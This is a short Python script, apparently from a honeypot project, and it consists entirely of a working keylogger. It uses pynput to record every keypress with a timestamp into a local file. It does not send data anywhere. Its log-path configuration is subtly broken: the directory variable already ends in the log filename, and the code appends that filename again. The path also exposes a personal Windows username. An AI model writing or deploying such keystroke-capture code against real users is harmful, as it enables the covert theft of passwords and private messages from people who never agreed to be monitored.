from pynput.keyboard import Listener
import os
import datetime

# Configuration
LOG_DIR = r"C:\Users\sujal\Desktop\Honeypot-Implementation-master\Keylogger\keystrokes.log"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")

def setup_logging():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle special keys
            if hasattr(key, 'char'):
                f.write(f"[{timestamp}] {key.char}\n")
            else:
                f.write(f"[{timestamp}] {str(key)}\n")
                
    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    setup_logging()
    with Listener(on_press=on_press) as listener:
        print("Keylogger started. Press Ctrl+C to stop.")
        listener.join()

if __name__ == "__main__":
    start_keylogger()